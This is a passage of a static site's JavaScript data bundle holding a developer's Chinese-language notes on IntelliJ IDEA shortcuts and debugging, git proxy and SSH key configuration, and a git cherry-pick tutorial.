idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/02.IDEA%E6%9F%A5%E7%9C%8B%E6%8E%A5%E5%8F%A3%E6%88%96%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E5%AE%9E%E7%8E%B0%E5%85%B3%E7%B3%BB%E5%9B%BE.html",relativePath:"08.软件使用/03.intellij idea/02.IDEA查看接口或类的继承实现关系图.md",key:"v-d5f8a570",path:"/pages/258ff7/",headersStr:null,content:"有时候看源码的时候，会经常性的把复杂类的关系搞混，下次碰到这种情况，应该从上到下把继承关系和接口理解清楚，这样看源码就会有一条主线。\n\n\n# 1. 看继承关系\n\n快捷键 crtl + H 查看hierarchy,只能查看向上向下继承关系，而不能看实现了哪些接口。\n\n右键选择Diagrams（也可以使用快捷键ctrl+alt+u，更快捷），然后显示\n\n\n# 2.看接口的实现关系\n\ncrtl + alt + B会显示出跟这个接口有关系的类。\n\n然后把需要的拖过来，形成树状图。(我暂时还没找到快捷的方法)\n\n\n\n这样就形成了基本的关系图(可以自己选择想要的类或接口)：\n\n * 蓝色实线表示的是继承关系\n * 绿色虚线表示的是接口实现关系\n * 绿色实线表示的是接口与接口的关系\n\n\n# 3. 展示类/接口的详细信息：\n\n第一种方法：右键有show categories，选择的展开类种的属性，方法，构造方法等。\n\n第二种方法：直接使用上面的工具栏\n\n\n\n上述从左到右依次为字段、构造方法、方法、配置文件（properties）、内部类\n\n就会得到这样的结果：\n\n",normalizedContent:"有时候看源码的时候，会经常性的把复杂类的关系搞混，下次碰到这种情况，应该从上到下把继承关系和接口理解清楚，这样看源码就会有一条主线。\n\n\n# 1. 看继承关系\n\n快捷键 crtl + h 查看hierarchy,只能查看向上向下继承关系，而不能看实现了哪些接口。\n\n右键选择diagrams（也可以使用快捷键ctrl+alt+u，更快捷），然后显示\n\n\n# 2.看接口的实现关系\n\ncrtl + alt + b会显示出跟这个接口有关系的类。\n\n然后把需要的拖过来，形成树状图。(我暂时还没找到快捷的方法)\n\n\n\n这样就形成了基本的关系图(可以自己选择想要的类或接口)：\n\n * 蓝色实线表示的是继承关系\n * 绿色虚线表示的是接口实现关系\n * 绿色实线表示的是接口与接口的关系\n\n\n# 3. 展示类/接口的详细信息：\n\n第一种方法：右键有show categories，选择的展开类种的属性，方法，构造方法等。\n\n第二种方法：直接使用上面的工具栏\n\n\n\n上述从左到右依次为字段、构造方法、方法、配置文件（properties）、内部类\n\n就会得到这样的结果：\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"idea查找和替换",frontmatter:{title:"idea查找和替换",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/c59997/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/03.idea%E6%9F%A5%E6%89%BE%E5%92%8C%E6%9B%BF%E6%8D%A2.html",relativePath:"08.软件使用/03.intellij idea/03.idea查找和替换.md",key:"v-61631aa4",path:"/pages/c59997/",headersStr:null,content:"有时候快捷键会冲突，在这个位置可以点出来",normalizedContent:"有时候快捷键会冲突，在这个位置可以点出来",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"IDEA在当前类中查找方法快捷键",frontmatter:{title:"IDEA在当前类中查找方法快捷键",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/668262/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/04.IDEA%E5%9C%A8%E5%BD%93%E5%89%8D%E7%B1%BB%E4%B8%AD%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95%E5%BF%AB%E6%8D%B7%E9%94%AE.html",relativePath:"08.软件使用/03.intellij idea/04.IDEA在当前类中查找方法快捷键.md",key:"v-33fd4594",path:"/pages/668262/",headersStr:null,content:"IDEA工具是当前类中查找一个方法快捷键：\n\nCtrl + F12\n\n例如在String类中查找contains方法。\n\n第一步：Ctrl + F12 第二步：直接输入要查找的方法名",normalizedContent:"idea工具是当前类中查找一个方法快捷键：\n\nctrl + f12\n\n例如在string类中查找contains方法。\n\n第一步：ctrl + f12 第二步：直接输入要查找的方法名",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Idea在debug模式下,直接停止程序(不执行断点后的代码)",frontmatter:{title:"Idea在debug模式下,直接停止程序(不执行断点后的代码)",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d3b595/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/05.Idea%E5%9C%A8debug%E6%A8%A1%E5%BC%8F%E4%B8%8B,%E7%9B%B4%E6%8E%A5%E5%81%9C%E6%AD%A2%E7%A8%8B%E5%BA%8F(%E4%B8%8D%E6%89%A7%E8%A1%8C%E6%96%AD%E7%82%B9%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81).html",relativePath:"08.软件使用/03.intellij idea/05.Idea在debug模式下,直接停止程序(不执行断点后的代码).md",key:"v-38709449",path:"/pages/d3b595/",headersStr:null,content:"# Idea在debug模式下,直接停止程序(不执行断点后的代码)\n\n在日常使用idea的过程中,debug模式运行代码.以前不想执行后面的代码的时候就直接点击停止 现在发现其实并不是直接停止了,后面的代码还是会运行. 这个问题在日常的测试中还好,影响不大,但是在调用接口的测试时,是会占用接口的调用次数这些限制的 首先看一下流程 浏览器访问,断点到second,此时点击停止 浏览器打印了最后结果,控制台打印的执行过程如下\n\n\n# 解决办法\n\n使用force return 依旧是运行到断点位置 在当前的方法上右键,选择force return 这时候会让输入强制的返回值(类型参考方法的返回值) 点击ok,并放开断点,查看浏览器的结果显示 再查看控制台,只打印了first 所以在断点的当前这一句也没有执行.ok问题解决",normalizedContent:"# idea在debug模式下,直接停止程序(不执行断点后的代码)\n\n在日常使用idea的过程中,debug模式运行代码.以前不想执行后面的代码的时候就直接点击停止 现在发现其实并不是直接停止了,后面的代码还是会运行. 这个问题在日常的测试中还好,影响不大,但是在调用接口的测试时,是会占用接口的调用次数这些限制的 首先看一下流程 浏览器访问,断点到second,此时点击停止 浏览器打印了最后结果,控制台打印的执行过程如下\n\n\n# 解决办法\n\n使用force return 依旧是运行到断点位置 在当前的方法上右键,选择force return 这时候会让输入强制的返回值(类型参考方法的返回值) 点击ok,并放开断点,查看浏览器的结果显示 再查看控制台,只打印了first 所以在断点的当前这一句也没有执行.ok问题解决",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"intellij idea如何全局重命名变量、方法、文件夹名？",frontmatter:{title:"intellij idea如何全局重命名变量、方法、文件夹名？",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4e3fff/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/06.intellij%20idea%E5%A6%82%E4%BD%95%E5%85%A8%E5%B1%80%E9%87%8D%E5%91%BD%E5%90%8D%E5%8F%98%E9%87%8F%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%EF%BC%9F.html",relativePath:"08.软件使用/03.intellij idea/06.intellij idea如何全局重命名变量、方法、文件夹名？.md",key:"v-4965fc70",path:"/pages/4e3fff/",headersStr:null,content:"使用intellij idea开发过程中，经常需要重命名变量、方法、文件名，我们需要的效果是，修改一处，引用过这些名字的地方也会相应的修改（牵一发而动全身），是不是非常方便呢。开始操作\n\n这里以变量名为例先选中变量明，按快捷键Shift+F6出现：\n\n选择 Rename all occurrences 项后即可以直接修改result变量名称，而且是全局的效果。\n\n再以重命名类名为例，效果同上，选中类后也是按快捷键Shift+F6：\n\n默认的快捷键是 Shift+F6，如果你的不是的话请设置keymap项里的快捷键，也可以：\n\n选中后鼠标右击 》Refactor 》Rename，出现的效果和快捷键 Shift+F6是一样的。",normalizedContent:"使用intellij idea开发过程中，经常需要重命名变量、方法、文件名，我们需要的效果是，修改一处，引用过这些名字的地方也会相应的修改（牵一发而动全身），是不是非常方便呢。开始操作\n\n这里以变量名为例先选中变量明，按快捷键shift+f6出现：\n\n选择 rename all occurrences 项后即可以直接修改result变量名称，而且是全局的效果。\n\n再以重命名类名为例，效果同上，选中类后也是按快捷键shift+f6：\n\n默认的快捷键是 shift+f6，如果你的不是的话请设置keymap项里的快捷键，也可以：\n\n选中后鼠标右击 》refactor 》rename，出现的效果和快捷键 shift+f6是一样的。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"idea  git blame 查看代码是谁修改的",frontmatter:{title:"idea  git blame 查看代码是谁修改的",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/a2c2af/",categories:["软件使用","intellij idea"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/03.intellij%20idea/07.idea%20%20git%20blame%20%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81%E6%98%AF%E8%B0%81%E4%BF%AE%E6%94%B9%E7%9A%84.html",relativePath:"08.软件使用/03.intellij idea/07.idea  git blame 查看代码是谁修改的.md",key:"v-958067f4",path:"/pages/a2c2af/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"配置了代理之后，git clone等git操作速度依然很慢的解决办法",frontmatter:{title:"配置了代理之后，git clone等git操作速度依然很慢的解决办法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/931104/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/01.%E9%85%8D%E7%BD%AE%E4%BA%86%E4%BB%A3%E7%90%86%E4%B9%8B%E5%90%8E%EF%BC%8Cgit%20clone%E7%AD%89git%E6%93%8D%E4%BD%9C%E9%80%9F%E5%BA%A6%E4%BE%9D%E7%84%B6%E5%BE%88%E6%85%A2%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html",relativePath:"08.软件使用/04.git/01.配置了代理之后，git clone等git操作速度依然很慢的解决办法.md",key:"v-2aaa4ead",path:"/pages/931104/",headersStr:null,content:"使用github的时候由于网站在国外经常访问速度有点慢，如果将项目托管到github就会产生clone速度太慢而导致花费时间过长的问题，但是配置了代理之后网站访问确实快了，但是git客户端依然不能加速 下面就是解决方法\n\n究其原因因为git还是通过默认的方式去访问github的服务，所以需要让git访问本地的代理服务\n\n先查看软件的配置信息，要根据这个对Git进行配置\n\n然后做如下设置:\n\n对Git进行配置\n\n# 可以参考以下配置，这里的127.0.0.1代表的就是你本机的IP地址，因为服务就在你本机上运行\ngit config --global https.proxy http://127.0.0.1:10809\ngit config --global https.proxy http://127.0.0.1:10809\ngit config --global http.proxy 'socks5://127.0.0.1:10808'\ngit config --global https.proxy 'socks5://127.0.0.1:10808'\n\n\n1\n2\n3\n4\n5\n\n\n查看是否配置成功\n\ngit config --list\n\n配置文件位置一般是当前用户目录下的.gitconfig\n\n最后的速度很快：\n\n取消\n\ngit config --global --unset http.proxy\ngit config --global --unset https.proxy\n\n\n1\n2\n",normalizedContent:"使用github的时候由于网站在国外经常访问速度有点慢，如果将项目托管到github就会产生clone速度太慢而导致花费时间过长的问题，但是配置了代理之后网站访问确实快了，但是git客户端依然不能加速 下面就是解决方法\n\n究其原因因为git还是通过默认的方式去访问github的服务，所以需要让git访问本地的代理服务\n\n先查看软件的配置信息，要根据这个对git进行配置\n\n然后做如下设置:\n\n对git进行配置\n\n# 可以参考以下配置，这里的127.0.0.1代表的就是你本机的ip地址，因为服务就在你本机上运行\ngit config --global https.proxy http://127.0.0.1:10809\ngit config --global https.proxy http://127.0.0.1:10809\ngit config --global http.proxy 'socks5://127.0.0.1:10808'\ngit config --global https.proxy 'socks5://127.0.0.1:10808'\n\n\n1\n2\n3\n4\n5\n\n\n查看是否配置成功\n\ngit config --list\n\n配置文件位置一般是当前用户目录下的.gitconfig\n\n最后的速度很快：\n\n取消\n\ngit config --global --unset http.proxy\ngit config --global --unset https.proxy\n\n\n1\n2\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"git 配置 SSH",frontmatter:{title:"git 配置 SSH",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/ea2d5c/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/02.git%20%E9%85%8D%E7%BD%AE%20SSH.html",relativePath:"08.软件使用/04.git/02.git 配置 SSH.md",key:"v-42449b31",path:"/pages/ea2d5c/",headersStr:null,content:'Git是分布式的代码管理工具，远程的代码管理是基于SSH的，所以要使用远程的Git则需要SSH的配置。 github的SSH配置如下：\n\n\n# 一 、设置Git的user name和email：\n\n$ git config --global user.name "xuhaiyan"\n$ git config --global user.email "haiyan.xu.vip@gmail.com"\n\n\n1\n2\n\n\n\n# 二、生成SSH密钥过程：\n\n1.查看是否已经有了ssh密钥：cd ~/.ssh 如果没有密钥则不会有此文件夹，有则备份删除 2.生成密钥：\n\n$ ssh-keygen -t rsa\n\n\n1\n\n\n如果提示  ssh-keygen 不是内部命令或者。。。\n\n这时候要配置环境变量，具体操作如下：\n\n1.找到Git/usr/bin目录下的ssh-keygen.exe(如果找不到，可以在计算机全局搜索)\n\n2.属性--\x3e高级系统设置--\x3e环境变量--\x3e系统变量,找到Path变量，进行编辑，End到最后，输入分号，粘贴复制的ssh-keygen所在的路径，保存；\n\n按3个回车，密码为空。\n\nYour identification has been saved in /home/tekkub/.ssh/id_rsa.\nYour public key has been saved in /home/tekkub/.ssh/id_rsa.pub.\nThe key fingerprint is:\n………………\n\n\n1\n2\n3\n4\n\n\n最后得到了两个文件：id\\_rsa和id\\_rsa.pub\n\n3.添加密钥到ssh：ssh-add 文件名 需要之前输入密码。 cd ~/.ssh 文件夹 在：有一个文件名为id_rsa.pub，把里面的内容复制到git库的我的SSHKEYs中\n\n4.在github上添加ssh密钥，这要添加的是“id_rsa.pub”里面的公钥。 打开https://github.com/ ，然后添加ssh。\n\n5.测试：ssh git@github.com\n\nThe authenticity of host ‘github.com (207.97.227.239)’ can’t be established.\nRSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added ‘github.com,207.97.227.239′ (RSA) to the list of known hosts.\nERROR: Hi tekkub! You’ve successfully authenticated, but GitHub does not provide shell access\nConnection to github.com closed.\n\n\n1\n2\n3\n4\n5\n6\n',normalizedContent:'git是分布式的代码管理工具，远程的代码管理是基于ssh的，所以要使用远程的git则需要ssh的配置。 github的ssh配置如下：\n\n\n# 一 、设置git的user name和email：\n\n$ git config --global user.name "xuhaiyan"\n$ git config --global user.email "haiyan.xu.vip@gmail.com"\n\n\n1\n2\n\n\n\n# 二、生成ssh密钥过程：\n\n1.查看是否已经有了ssh密钥：cd ~/.ssh 如果没有密钥则不会有此文件夹，有则备份删除 2.生成密钥：\n\n$ ssh-keygen -t rsa\n\n\n1\n\n\n如果提示  ssh-keygen 不是内部命令或者。。。\n\n这时候要配置环境变量，具体操作如下：\n\n1.找到git/usr/bin目录下的ssh-keygen.exe(如果找不到，可以在计算机全局搜索)\n\n2.属性--\x3e高级系统设置--\x3e环境变量--\x3e系统变量,找到path变量，进行编辑，end到最后，输入分号，粘贴复制的ssh-keygen所在的路径，保存；\n\n按3个回车，密码为空。\n\nyour identification has been saved in /home/tekkub/.ssh/id_rsa.\nyour public key has been saved in /home/tekkub/.ssh/id_rsa.pub.\nthe key fingerprint is:\n………………\n\n\n1\n2\n3\n4\n\n\n最后得到了两个文件：id\\_rsa和id\\_rsa.pub\n\n3.添加密钥到ssh：ssh-add 文件名 需要之前输入密码。 cd ~/.ssh 文件夹 在：有一个文件名为id_rsa.pub，把里面的内容复制到git库的我的sshkeys中\n\n4.在github上添加ssh密钥，这要添加的是“id_rsa.pub”里面的公钥。 打开https://github.com/ ，然后添加ssh。\n\n5.测试：ssh git@github.com\n\nthe authenticity of host ‘github.com (207.97.227.239)’ can’t be established.\nrsa key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.\nare you sure you want to continue connecting (yes/no)? yes\nwarning: permanently added ‘github.com,207.97.227.239′ (rsa) to the list of known hosts.\nerror: hi tekkub! you’ve successfully authenticated, but github does not provide shell access\nconnection to github.com closed.\n\n\n1\n2\n3\n4\n5\n6\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"git 为 ssh 协议配置代理",frontmatter:{title:"git 为 ssh 协议配置代理",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4bc0ff/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/03.git%20%E4%B8%BA%20ssh%20%E5%8D%8F%E8%AE%AE%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86.html",relativePath:"08.软件使用/04.git/03.git 为 ssh 协议配置代理.md",key:"v-c3423534",path:"/pages/4bc0ff/",headersStr:null,content:'之前讲过给http协议设置代理加快git对Github的访问（ 配置了代理之后，git clone等git操作速度依然很慢的解决办法 ），使得git clone 速度提升，但是这个方法对ssh协议是没有效果的\n\n然后在网上大部分找到的ssh协议设置代理的方法都是在对~\\.ssh\\config进行配置，加入下面的配置 ,如果不存在这个文件就直接自己建立一个\n\nHost github.com\n    User git\n    ProxyCommand nc -v -x 127.0.0.1:1086 %h %p\n\n\n1\n2\n3\n\n\n但是当我配置了这个之后就会报错 可能是操作系统不同的原因，因为发现好像成功配置的大多是mac用户和linux用户 然后经过查阅资料发现，按照如下配置才可以解决问题\n\nProxyCommand connect -S 127.0.0.1:10801 -a none %h %p\n\nHost github.com\n  User git\n  Port 22\n  Hostname github.com\n  # 注意修改路径为你的路径\n  IdentityFile "C:\\Users\\One\\.ssh\\id_rsa"\n  TCPKeepAlive yes\n\nHost ssh.github.com\n  User git\n  Port 443\n  Hostname ssh.github.com\n  # 注意修改路径为你的路径\n  IdentityFile "C:\\Users\\One\\.ssh\\id_rsa"\n  TCPKeepAlive yes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n这里的路径必须为绝对路径 然后那个One是用户名 需要改成自己的名字',normalizedContent:'之前讲过给http协议设置代理加快git对github的访问（ 配置了代理之后，git clone等git操作速度依然很慢的解决办法 ），使得git clone 速度提升，但是这个方法对ssh协议是没有效果的\n\n然后在网上大部分找到的ssh协议设置代理的方法都是在对~\\.ssh\\config进行配置，加入下面的配置 ,如果不存在这个文件就直接自己建立一个\n\nhost github.com\n    user git\n    proxycommand nc -v -x 127.0.0.1:1086 %h %p\n\n\n1\n2\n3\n\n\n但是当我配置了这个之后就会报错 可能是操作系统不同的原因，因为发现好像成功配置的大多是mac用户和linux用户 然后经过查阅资料发现，按照如下配置才可以解决问题\n\nproxycommand connect -s 127.0.0.1:10801 -a none %h %p\n\nhost github.com\n  user git\n  port 22\n  hostname github.com\n  # 注意修改路径为你的路径\n  identityfile "c:\\users\\one\\.ssh\\id_rsa"\n  tcpkeepalive yes\n\nhost ssh.github.com\n  user git\n  port 443\n  hostname ssh.github.com\n  # 注意修改路径为你的路径\n  identityfile "c:\\users\\one\\.ssh\\id_rsa"\n  tcpkeepalive yes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n这里的路径必须为绝对路径 然后那个one是用户名 需要改成自己的名字',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"git cherry-pick 教程",frontmatter:{title:"git cherry-pick 教程",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/fc5ea7/",categories:["软件使用","git"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/04.git/04.git%20cherry-pick%20%E6%95%99%E7%A8%8B.html",relativePath:"08.软件使用/04.git/04.git cherry-pick 教程.md",key:"v-2872a9d9",path:"/pages/fc5ea7/",headers:[{level:2,title:"一、基本用法",slug:"一、基本用法",normalizedTitle:"一、基本用法",charIndex:134},{level:2,title:"二、转移多个提交",slug:"二、转移多个提交",normalizedTitle:"二、转移多个提交",charIndex:824},{level:2,title:"三、配置项",slug:"三、配置项",normalizedTitle:"三、配置项",charIndex:1188},{level:2,title:"四、代码冲突",slug:"四、代码冲突",normalizedTitle:"四、代码冲突",charIndex:1794},{level:2,title:"五、转移到另一个代码库",slug:"五、转移到另一个代码库",normalizedTitle:"五、转移到另一个代码库",charIndex:2065}],headersStr:"一、基本用法 二、转移多个提交 三、配置项 四、代码冲突 五、转移到另一个代码库",content:"对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。\n\n这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 Cherry pick。\n\n\n\n\n# 一、基本用法\n\ngit cherry-pick命令的作用，就是将指定的提交（commit）应用于其他分支。\n\n>  $ git cherry-pick <commitHash> \n> \n> \n> 1\n\n上面命令就会将指定的提交commitHash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。\n\n举例来说，代码仓库有master和feature两个分支。\n\n>  a - b - c - d   Master\n>          \\\n>            e - f - g Feature \n> \n> \n> 1\n> 2\n> 3\n\n现在将提交f应用到master分支。\n\n>  # 切换到 master 分支 $ git checkout master\n> \n> # Cherry pick 操作 $ git cherry-pick f \n> \n> \n> 1\n> 2\n> 3\n\n上面的操作完成以后，代码库就变成了下面的样子。\n\n>  a - b - c - d - f   Master\n>          \\\n>            e - f - g Feature \n> \n> \n> 1\n> 2\n> 3\n\n从上面可以看到，master分支的末尾增加了一个提交f。\n\ngit cherry-pick命令的参数，不一定是提交的哈希值，分支名也是可以的，表示转移该分支的最新提交。\n\n>  $ git cherry-pick feature \n> \n> \n> 1\n\n上面代码表示将feature分支的最近一次提交，转移到当前分支。\n\n\n# 二、转移多个提交\n\nCherry pick 支持一次转移多个提交。\n\n>  $ git cherry-pick <HashA> <HashB> \n> \n> \n> 1\n\n上面的命令将 A 和 B 两个提交应用到当前分支。这会在当前分支生成两个对应的新提交。\n\n如果想要转移一系列的连续提交，可以使用下面的简便语法。\n\n>  $ git cherry-pick A..B \n> \n> \n> 1\n\n上面的命令可以转移从 A 到 B 的所有提交。它们必须按照正确的顺序放置：提交 A 必须早于提交 B，否则命令将失败，但不会报错。\n\n注意，使用上面的命令，提交 A 将不会包含在 Cherry pick 中。如果要包含提交 A，可以使用下面的语法。\n\n>  $ git cherry-pick A^..B \n> \n> \n> 1\n\n\n# 三、配置项\n\ngit cherry-pick命令的常用配置项如下。\n\n（1）-e，--edit\n\n打开外部编辑器，编辑提交信息。\n\n（2）-n，--no-commit\n\n只更新工作区和暂存区，不产生新的提交。\n\n（3）-x\n\n在提交信息的末尾追加一行(cherry picked from commit ...)，方便以后查到这个提交是如何产生的。\n\n（4）-s，--signoff\n\n在提交信息的末尾追加一行操作者的签名，表示是谁进行了这个操作。\n\n（5）-m parent-number，--mainline parent-number\n\n如果原始提交是一个合并节点，来自于两个分支的合并，那么 Cherry pick 默认将失败，因为它不知道应该采用哪个分支的代码变动。\n\n-m配置项告诉 Git，应该采用哪个分支的变动。它的参数parent-number是一个从1开始的整数，代表原始提交的父分支编号。\n\n>  $ git cherry-pick -m 1 <commitHash> \n> \n> \n> 1\n\n上面命令表示，Cherry pick 采用提交commitHash来自编号1的父分支的变动。\n\n一般来说，1号父分支是接受变动的分支（the branch being merged into），2号父分支是作为变动来源的分支（the branch being merged from）。\n\n\n# 四、代码冲突\n\n如果操作过程中发生代码冲突，Cherry pick 会停下来，让用户决定如何继续操作。\n\n（1）--continue\n\n用户解决代码冲突后，第一步将修改的文件重新加入暂存区（git add .），第二步使用下面的命令，让 Cherry pick 过程继续执行。\n\n>  $ git cherry-pick --continue \n> \n> \n> 1\n\n（2）--abort\n\n发生代码冲突后，放弃合并，回到操作前的样子。\n\n（3）--quit\n\n发生代码冲突后，退出 Cherry pick，但是不回到操作前的样子。\n\n\n# 五、转移到另一个代码库\n\nCherry pick 也支持转移另一个代码库的提交，方法是先将该库加为远程仓库。\n\n>  $ git remote add target git://gitUrl \n> \n> \n> 1\n\n上面命令添加了一个远程仓库target。\n\n然后，将远程代码抓取到本地。\n\n>  $ git fetch target \n> \n> \n> 1\n\n上面命令将远程代码仓库抓取到本地。\n\n接着，检查一下要从远程仓库转移的提交，获取它的哈希值。\n\n>  $ git log target/master \n> \n> \n> 1\n\n最后，使用git cherry-pick命令转移提交。\n\n>  $ git cherry-pick <commitHash> \n> \n> \n> 1",normalizedContent:"对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。\n\n这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 cherry pick。\n\n\n\n\n# 一、基本用法\n\ngit cherry-pick命令的作用，就是将指定的提交（commit）应用于其他分支。\n\n>  $ git cherry-pick <commithash> \n> \n> \n> 1\n\n上面命令就会将指定的提交commithash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。\n\n举例来说，代码仓库有master和feature两个分支。\n\n>  a - b - c - d   master\n>          \\\n>            e - f - g feature \n> \n> \n> 1\n> 2\n> 3\n\n现在将提交f应用到master分支。\n\n>  # 切换到 master 分支 $ git checkout master\n> \n> # cherry pick 操作 $ git cherry-pick f \n> \n> \n> 1\n> 2\n> 3\n\n上面的操作完成以后，代码库就变成了下面的样子。\n\n>  a - b - c - d - f   master\n>          \\\n>            e - f - g feature \n> \n> \n> 1\n> 2\n> 3\n\n从上面可以看到，master分支的末尾增加了一个提交f。\n\ngit cherry-pick命令的参数，不一定是提交的哈希值，分支名也是可以的，表示转移该分支的最新提交。\n\n>  $ git cherry-pick feature \n> \n> \n> 1\n\n上面代码表示将feature分支的最近一次提交，转移到当前分支。\n\n\n# 二、转移多个提交\n\ncherry pick 支持一次转移多个提交。\n\n>  $ git cherry-pick <hasha> <hashb> \n> \n> \n> 1\n\n上面的命令将 a 和 b 两个提交应用到当前分支。这会在当前分支生成两个对应的新提交。\n\n如果想要转移一系列的连续提交，可以使用下面的简便语法。\n\n>  $ git cherry-pick a..b \n> \n> \n> 1\n\n上面的命令可以转移从 a 到 b 的所有提交。它们必须按照正确的顺序放置：提交 a 必须早于提交 b，否则命令将失败，但不会报错。\n\n注意，使用上面的命令，提交 a 将不会包含在 cherry pick 中。如果要包含提交 a，可以使用下面的语法。\n\n>  $ git cherry-pick a^..b \n> \n> \n> 1\n\n\n# 三、配置项\n\ngit cherry-pick命令的常用配置项如下。\n\n（1）-e，--edit\n\n打开外部编辑器，编辑提交信息。\n\n（2）-n，--no-commit\n\n只更新工作区和暂存区，不产生新的提交。\n\n（3）-x\n\n在提交信息的末尾追加一行(cherry picked from commit ...)，方便以后查到这个提交是如何产生的。\n\n（4）-s，--signoff\n\n在提交信息的末尾追加一行操作者的签名，表示是谁进行了这个操作。\n\n（5）-m parent-number，--mainline parent-number\n\n如果原始提交是一个合并节点，来自于两个分支的合并，那么 cherry pick 默认将失败，因为它不知道应该采用哪个分支的代码变动。\n\n-m配置项告诉 git，应该采用哪个分支的变动。它的参数parent-number是一个从1开始的整数，代表原始提交的父分支编号。\n\n>  $ git cherry-pick -m 1 <commithash> \n> \n> \n> 1\n\n上面命令表示，cherry pick 采用提交commithash来自编号1的父分支的变动。\n\n一般来说，1号父分支是接受变动的分支（the branch being merged into），2号父分支是作为变动来源的分支（the branch being merged from）。\n\n\n# 四、代码冲突\n\n如果操作过程中发生代码冲突，cherry pick 会停下来，让用户决定如何继续操作。\n\n（1）--continue\n\n用户解决代码冲突后，第一步将修改的文件重新加入暂存区（git add .），第二步使用下面的命令，让 cherry pick 过程继续执行。\n\n>  $ git cherry-pick --continue \n> \n> \n> 1\n\n（2）--abort\n\n发生代码冲突后，放弃合并，回到操作前的样子。\n\n（3）--quit\n\n发生代码冲突后，退出 cherry pick，但是不回到操作前的样子。\n\n\n# 五、转移到另一个代码库\n\ncherry pick 也支持转移另一个代码库的提交，方法是先将该库加为远程仓库。\n\n>  $ git remote add target git://giturl \n> \n> \n> 1\n\n上面命令添加了一个远程仓库target。\n\n然后，将远程代码抓取到本地。\n\n>  $ git fetch target \n> \n> \n> 1\n\n上面命令将远程代码仓库抓取到本地。\n\n接着，检查一下要从远程仓库转移的提交，获取它的哈希值。\n\n>  $ git log target/master \n> \n> \n> 